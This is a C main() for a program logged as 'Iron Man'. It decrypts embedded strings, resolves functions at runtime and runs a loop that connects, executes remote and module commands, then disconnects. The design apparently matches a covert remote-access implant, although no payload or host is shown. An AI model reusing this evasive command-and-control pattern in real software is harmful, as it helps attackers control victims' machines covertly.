#include "commands/commands.h"
#include "communication/connection.h"
#include "functions/functions.h"
#include "logging/logging.h"

int main(const int argc, const char *const argv[]) {
    INITIALIZE_RESULT(res);

    // Decrypt the strings.
    decrypt_strings();

    // Dynamically load the functions.
    res = load_all_functions();
    HANDLE_ERROR_RESULT(res)

    // Start logging.
    res = start_logging();
    HANDLE_ERROR_RESULT(res)

    WRITE_LOG(CRITICAL, "Started Iron Man", NULL)

    // Initialize the builtin commands.
    res = initialize_commands();
    HANDLE_ERROR_RESULT(res)

    // Keep accepting and serving connections until an error occurs or asked to stop.
    while (1) {
        // Accept a new connection.
        res = connect_();
        HANDLE_ERROR_RESULT(res)

        // Communicate.
        WRITE_LOG(WARNING, "Connected", NULL)
        res = communicate(argv[0]);
        WRITE_LOG(WARNING, "Disconnected", NULL)

        // Disconnect and destroy the module commands.
        disconnect();
        destroy_module_commands();

        HANDLE_ERROR_RESULT(res)
    }

    error_cleanup:

    // Destroy the module commands.
    destroy_module_commands();

    // Destroy the builtin commands.
    destroy_commands();

    WRITE_LOG(CRITICAL, "Stopped Iron Man", NULL)

    // Stop logging.
    stop_logging();

    return EXIT_SUCCESS;
}
